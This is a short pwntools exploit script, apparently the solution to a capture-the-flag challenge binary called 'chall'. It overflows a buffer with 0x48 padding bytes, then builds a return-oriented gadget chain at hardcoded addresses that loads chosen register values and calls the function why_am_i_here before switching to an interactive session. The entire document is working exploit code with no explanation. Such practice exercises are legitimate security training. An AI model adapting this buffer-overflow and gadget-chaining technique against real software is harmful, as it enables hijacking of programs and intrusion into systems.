from pwn import *

exe = ELF("./chall")
context.binary = exe

if args.GDB:
	r = gdb.debug("./chall", """
		c
	""")
else:
	r = process("./chall")

popper = 0x40123a
caller = 0x401220
payload = b"A" * 0x48
payload += flat([
	popper,
	0x0,
	0x1,
	0xdeadbeef,
	0xcafebabe,
	0x0badf00d,
	exe.sym.why_am_i_here,
	caller
])
r.send(payload)

r.interactive()
